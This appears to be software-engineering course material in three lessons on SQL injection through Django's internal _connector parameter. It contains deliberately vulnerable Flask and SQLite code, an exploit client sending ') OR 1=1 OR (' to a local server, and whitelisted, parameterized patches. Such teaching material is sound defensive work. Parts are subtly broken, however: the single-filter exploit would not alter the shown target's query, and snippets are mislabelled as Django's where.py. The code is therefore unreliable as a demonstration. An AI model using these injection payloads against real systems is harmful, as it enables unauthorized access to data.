---
title: Django ORM Real Exploit
course: Software Engineering
---

This section introduces the security concept of SQL injection that can arise when a system allows untrusted input to influence internal query construction. The core lesson is that even when a framework provides strong safety guarantees, developers can inadvertently bypass them by feeding user-controlled data into internal controls of the query builder. If internal parameters that control how a query is composed are exposed to external input, attackers can alter the intended logic of a query and execute arbitrary SQL fragments. This is a reminder that safe defaults and strict input validation are fundamental defenses in software design.

## About the Product

Django is a high-level, open-source web framework for Python that emphasizes rapid development and clean, pragmatic design. Central to Django is an Object-Relational Mapper (ORM) that lets developers build and manipulate database queries using Python code rather than writing raw SQL. This abstraction is intended to increase developer productivity while reducing the likelihood of SQL injection by using parameterized statements and disciplined query construction. In everyday deployments, Django powers a wide range of applications, including web portals, REST APIs, dashboards, and back-office systems. The ORM is used to compose queries, filter results, combine conditions, and fetch data from relational databases.

Within Django, the ORM supports a fluent interface for chaining filters, exclusions, and lookups. Developers commonly build dynamic queries by aggregating user-provided criteria, sometimes by expanding dictionaries directly into filter calls or Q objects. This flexibility is powerful but comes with responsibility: user input must be validated, whitelisted, and restricted to known, safe fields and operators. When this discipline is not followed, even a robust ORM can be coaxed into producing unsafe SQL.

## The Intended Behavior

The intended behavior of the Django ORM in this context is to translate Python-level query constructs into safe, parameterized SQL that respects the developer's intent. Queries should be built from well-defined, whitelisted fields and operators, with internal control parameters kept isolated from user input. The ORM's public APIs—such as filter(), exclude(), get(), and Q()—are designed to provide a structured way to express conditions, while the underlying SQL engine ensures that values are bound as parameters rather than concatenated into SQL strings. The security assumption is that developers will not funnel untrusted input into internal query controls or internal state that governs how clauses are connected (for example, how AND/OR connectors are chosen).

In practice, this means that constructing a query should rely on explicit field names, validated operators, and input that has been filtered to an allowed set. The design relies on the separation between data and control logic: user-provided data becomes a value in a condition, not a directive about how to connect multiple conditions.

## The Vulnerability

The vulnerability arises when internal ORM parameters used to shape the logical structure of a query are exposed to or influenced by user input. In particular, the _connector parameter (and related internal knobs such as _negated) is intended for internal use by the ORM to decide how to combine multiple conditions (for example, whether to connect clauses with AND or OR). If a pattern like Model.objects.filter(**request.GET) is used, untrusted data can supply these internal controls, effectively altering the meaning of the entire WHERE clause. This enables a SQL injection that can modify the query logic, bypass authentication checks, or retrieve data that should be restricted.

The root cause is the unsafe expansion of user-controlled dictionaries into ORM methods. When a developer writes code that passes request parameters directly into a filter or Q object, the application may unwittingly allow keys that control query concatenation to be supplied by an attacker. The vulnerable behavior can be summarized as follows: an external input supplies keys and values that are interpreted by the ORM not only as filters, but also as internal directives for how to assemble the SQL query. If the framework does not strictly validate and constrain these inputs, the attacker can coerce the query into returning more data, bypassing restrictions, or performing unintended operations.

```python title="Vulnerable django/db/models/sql/where.py"
Model.objects.filter(**request.GET)
```

## Exploitation

Exploitation can occur when a web application accepts user-supplied parameters to build queries in a direct, dictionary-expanded manner. An attacker submits parameters that include legitimate filters alongside internal directives like _connector. For example, through a crafted HTTP request, an attacker could supply a value that changes a logical connector from AND to a destructive or bypassing clause, reshaping the WHERE clause to always true or to reveal data that should be hidden. The attack requires no special authentication in many cases, as the vulnerability resides in how input is consumed by the ORM rather than in the authentication mechanism itself. Public proof-of-concept materials demonstrated that such inputs can be used to exfiltrate data or circumvent business rules by manipulating the query's logical structure.

Detection often appears in logs with unusual or unexpected usage of internal parameters such as _connector or _negated, or in database logs that show anomalous WHERE clause structures. Analysts should correlate web request patterns with query plans to identify suspicious usage of internal controls exposed through user input.

## Impact

The impact of this vulnerability is severe because it directly compromises data confidentiality, integrity, and application logic. Attackers can execute arbitrary SQL fragments via the manipulated query, potentially exposing sensitive data, bypassing access controls, or altering data. The consequence can include data exfiltration, unauthorized data modification, or escalation of privileges within the application. Given the ubiquity of Django deployments, the vulnerability represents a broad risk across many services, especially dashboards and API backends that rely on dynamic filters.

The severity is heightened by the low barrier to exploitation: a remote attacker can trigger the vulnerability with standard HTTP requests, often without authenticated access, depending on the application's exposure. In practice, automated scanning and exploitation attempts increased after disclosure as attackers probed for vulnerable patterns in a wide range of Django-based services.

## Mitigation

Mitigation requires both immediate safeguards and long-term secure design changes. The primary defense is to stop expanding user-controlled dictionaries into ORM query construction. Instead, developers should explicitly whitelist acceptable query fields and construct filters from validated input. The ORM should be hardened to reject external input that attempts to influence internal query controls such as _connector or _negated. Patches typically enforce strict validation of these internal parameters, ensuring that only known, safe connectors can be used, and disallowing any attempt to set internal flags via external input. In environments where upgrading is not immediately possible, temporary mitigations include strong input validation, avoiding direct dictionary expansion, and employing network-level protections such as application gateways or WAF rules that detect and block attempts to manipulate query connectors.

It is also recommended to implement robust monitoring and auditing to detect unusual parameter usage and to conduct code reviews focused on query construction paths. Static analysis and CI/CD tooling can help identify vulnerable patterns like similarly escaped dictionary expansion and unfiltered user input propagating into ORM methods.

```python title="Secure django/db/models/sql/where.py" 
# Safer pattern: build filters from a whitelist instead of expanding user input
allowed = {"username", "email", "is_active"}
params = {k: v for k, v in request.GET.items() if k in allowed}
Model.objects.filter(**params)
```

---

---
title: SQL Injection through unsafe dictionary expansion Lesson
---

This lesson continues the exploration of how untrusted input can influence data access paths and query generation, even when using a robust framework. It shows how unsafe input can steer query construction and undermine protections if internal controls are exposed to the query-building path.

Security Concept: SQL Injection through unsafe dictionary expansion. This concept fits into the course topic Secure Data Access and Query Integrity, which examines how inputs flow from the web layer into the data layer and how improper handling can undermine data protection controls.

This lesson builds on the broader idea that inputs flow from the web layer into the data layer and that validating, whitelisting, and separating input handling from query construction are essential to maintain deterministic and auditable access controls.

## Introduction to the vulnerable program

The setting is a fictional internal HR analytics web application written in server-side Python. Its job is to let staff filter employee records through a web interface by supplying query parameters in HTTP requests. The program assumes that whatever comes from the web layer will be treated as part of the query specification and handed directly to the query builder. In this setup, internal control keys—such as a parameter named _connector or similar ones—can be exposed to the query construction path. There is no explicit whitelisting or validation to separate legitimate filter fields from internal control parameters. This creates a straightforward path for untrusted input to influence the resulting SQL logic.

```python
# Vulnerable: direct dictionary unpacking from user input

def search_employees(request):
    # User-provided query parameters, e.g., ?department=Engineering&_connector=OR
    params = dict(request.GET)
    # Unvalidated expansion into the query builder
    results = Employee.filter(**params)
    return results
```

## Exploring an exploit against the vulnerable program

The exploit aims to alter how the WHERE clause is assembled by injecting an internal control parameter that the query builder interprets as a logical connector. By supplying a key like _connector with a crafted value, an attacker can change the intended conjunction of conditions from the safe default (typically AND) to a broader one (such as OR). This effectively widens the scope of matching records, potentially bypassing access controls and exposing sensitive employee data. The exploit interacts with the vulnerable program by sending HTTP query parameters that include both legitimate filters and attacker-controlled control parameters, which the program then forwards directly into the query construction path.

```python
# Illustrative exploit (conceptual)
class MockRequest:
    def __init__(self, params):
        self.GET = params

def exploit_example():
    # Attacker targets the _connector to change join logic
    req = MockRequest({'department': 'Engineering', '_connector': ' OR '})
    return search_employees(req)
```

## Patching the program to prevent the exploit

The secure design approach removes the risk by refusing to pass untrusted user input through to the query builder as raw parameters. Instead, the application defines a whitelist of allowed filter fields and explicitly constructs the query from only those fields. Internal control parameters are filtered out early, and the query is built using safe, parameterized methods rather than unconstrained dictionary expansion. This ensures that attacker-provided keys cannot influence how the SQL logic is joined, and it aligns with the broader principle of keeping data access deterministic and auditable.

Safe, responsible usage: Demonstrations of this vulnerability and the mitigation should occur only in isolated lab environments and never against production data. Instructors should emphasize ethics and responsible security practice.

```python
# Patched approach: enforce a whitelist and build the query deterministically
ALLOWED_FIELDS = {'department', 'role', 'status', 'location'}

def search_employees_secure(request):
    raw_params = dict(request.GET)
    # Only keep whitelisted fields; drop internal controls like _connector
    safe_params = {k: v for k, v in raw_params.items() if k in ALLOWED_FIELDS}

    # Build the query in a controlled way using only safe parameters
    q = Employee.filter(**safe_params)
    return q.all()
```

---

---
title: SQL Injection via Unsafe Dynamic Query Construction Practice
---

This practice centers on a common and dangerous pattern: building SQL queries by directly concatenating user-provided inputs into the query string, including internal control parameters. By walking through a local, self-contained scenario, you will see how an attacker-controlled parameter such as _connector can alter the logic of a query and reveal data or bypass filters. The activity reinforces the design principle that all user input must be treated as untrusted, and that queries should be constructed through safe parameterization and strict whitelisting. After exploring the vulnerability, you will apply a safer design that eliminates unvalidated user influence over the query plan and demonstrates how to verify that the vulnerability is no longer present.

## Getting Started

This exercise uses Python to host a tiny inventory search API and a separate exploit client that runs on the same machine. The target relies on an in-memory SQLite database to store a small catalog of items. A lightweight web framework is used to expose an endpoint like /items, and the exploit demonstrates how a crafted request can modify the SQL logic through an internal control parameter named _connector. You will implement a safe version of the endpoint using parameterized queries and a whitelisted set of filters, then verify that the exploit no longer changes the semantics of the query.

### Virtual Environment

A virtual environment creates an isolated Python workspace where you can install and manage packages without affecting anything else on your system. It is not required for this practice, but it is strongly recommended because it gives you a clean and consistent setup. Using a virtual environment helps avoid conflicts and makes it easier to remove or reset dependencies later. You may continue without one, but adopting virtual environments early is a valuable habit.

```title="Create a Virtual Environment"
python -m venv .venv
```

```title="Activate the Virtual Environment"
# On Windows
.venv\Scripts\activate

# On MacOS or Linux
source .venv/bin/activate
```

```title="Deactivate the Virtual Environment"
deactivate
```

### Install Requirements

This exercise relies on a tiny web framework and the requests library for the exploit client. SQLite comes bundled with Python, so no separate installation is required for the database. Install the web framework and the HTTP client library used by the exploit client.

```bash title="Install Requirements"
pip install Flask requests
```

## Scenario Overview

In this scenario, you work with a local inventory search API that runs entirely on your machine. The API stores a sample catalog in an in-memory SQLite database and exposes an endpoint /items. The endpoint accepts query parameters and constructs a dynamic SQL query by concatenating user-provided values into a WHERE clause, including an internal control parameter named _connector. Because the code directly expands the parameters dictionary into the query builder, untrusted input can alter the intended query logic. The exploit client demonstrates how supplying a parameter such as _connector=) OR 1=1 OR ( can modify the executed SQL logic, potentially bypassing filters and exposing additional data.

This learning objective is to understand how unvalidated internal parameter handling in query construction leads to SQL injection and to practice safe input handling and parameterized query usage.

### Target Program

The target program implements a small inventory search API. It uses an in-memory SQLite database to store a few product records and exposes an endpoint at /items. The endpoint accepts query parameters and builds a SQL query by concatenating user-provided values, including the internal parameter _connector. This unsafe practice means that an attacker can inject SQL operators or predicates through user-controlled parameters, changing which rows are returned or causing data exposure.

```python title="target.py"
from flask import Flask, request
import sqlite3

app = Flask(__name__)

# In-memory database setup
conn = sqlite3.connect(':memory:', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('CREATE TABLE items (id INTEGER PRIMARY KEY, name TEXT, category TEXT, price REAL)')
items = [
    (1, 'Widget', 'Tools', 9.99),
    (2, 'Gadget', 'Electronics', 19.99),
    (3, 'Widget Pro', 'Tools', 29.99)
]
cursor.executemany('INSERT INTO items (id, name, category, price) VALUES (?, ?, ?, ?)', items)
conn.commit()

@app.route('/items')
def items():
    # Unsafe: builds WHERE clause by expanding user input, including _connector
    qparams = request.args.to_dict()
    connector = qparams.get('_connector', 'AND').upper()
    if '_connector' in qparams:
        del qparams['_connector']
    parts = []
    for k, v in qparams.items():
        if v is None or v == '':
            continue
        parts.append(f"{k} = '{v}'")
    if parts:
        where = f" {connector} ".join(parts)
        query = f"SELECT * FROM items WHERE {where}"
    else:
        query = "SELECT * FROM items"
    cur = conn.cursor()
    cur.execute(query)
    rows = cur.fetchall()
    return {"results": rows}

if __name__ == '__main__':
    app.run()
```

## Exploit Program

```title="exploit.py"
import requests

def run_exploits():
    url = 'http://localhost:5000/items'
    # Observing normal behavior
    resp1 = requests.get(url, params={'name': 'Widget'})
    print('Normal request response:\n', resp1.text)

    # Exploit attempt: injects SQL logic via _connector
    payload = {'name': 'Widget', '_connector': ') OR 1=1 OR ('}
    resp2 = requests.get(url, params=payload)
    print('Exploit response (attempt to alter logic):\n', resp2.text)

if __name__ == '__main__':
    run_exploits()
```

## Practice Objectives

### Task 1: Explore vulnerable behavior with a normal request

Describe how the target behaves under a standard query versus what you would expect when no injection occurs. Run the exploit client against the target using a benign request and observe the results to establish a baseline for normal operation.

```python
# Task 1: Observe normal behavior
import requests
resp = requests.get('http://localhost:5000/items', params={'name': 'Widget'})
print(resp.text)
```

### Task 2: Trigger vulnerability with a crafted request

Demonstrate that the internal control parameter _connector can be manipulated to influence the WHERE clause, enabling an injection-like effect. Use a crafted request that includes a malicious _connector value and observe the outcome.

```python
# Task 2: Exploit vulnerability via _connector injection
import requests
url = 'http://localhost:5000/items'
params = {'name': 'Widget', '_connector': ') OR 1=1 OR ('}
resp = requests.get(url, params=params)
print(resp.text)
```

### Task 3: Patch Task 1 — Implement a safe query construction

Replace the unsafe, string-concatenation approach with parameterized queries and a whitelist of allowed filters. The server should ignore external control parameters like _connector and only apply approved filters using placeholders for values.

```python
# Task 3: Patch — Safe query construction (target side)
import sqlite3
from flask import request

# Inside your route handler, replace the unsafe block with:
params = request.args.to_dict()
allowed = {'name', 'category', 'price'}  # whitelist
filters = []
values = []
for k, v in params.items():
    if k in allowed and v:
        filters.append(f"{k} = ?")
        values.append(v)
query = "SELECT * FROM items"
if filters:
    query += " WHERE " + " AND ".join(filters)
# Then execute with a parameterized call
cur = conn.cursor()
cur.execute(query, values)
rows = cur.fetchall()
print({"results": rows})
```

### Task 4: Patch Task 2 — Verify the patch by re-running exploit attempts

With the patch in place, re-run the same exploit attempts to verify that input is no longer able to influence the query through _connector and that only whitelisted filters are honored. The normal requests should continue to work, while injected payloads should have no effect on query semantics.

```python
# Task 4: Verification — re-run exploit attempts after patch
import requests
url = 'http://localhost:5000/items'

# Attempt 1: Normal request should still work
resp1 = requests.get(url, params={'name': 'Widget'})
print('Post-patch normal request:\n', resp1.text)

# Attempt 2: Previously vulnerable injection should have no effect
params = {'name': 'Widget', '_connector': ') OR 1=1 OR ('}
resp2 = requests.get(url, params=params)
print('Post-patch injection attempt response:\n', resp2.text)
```
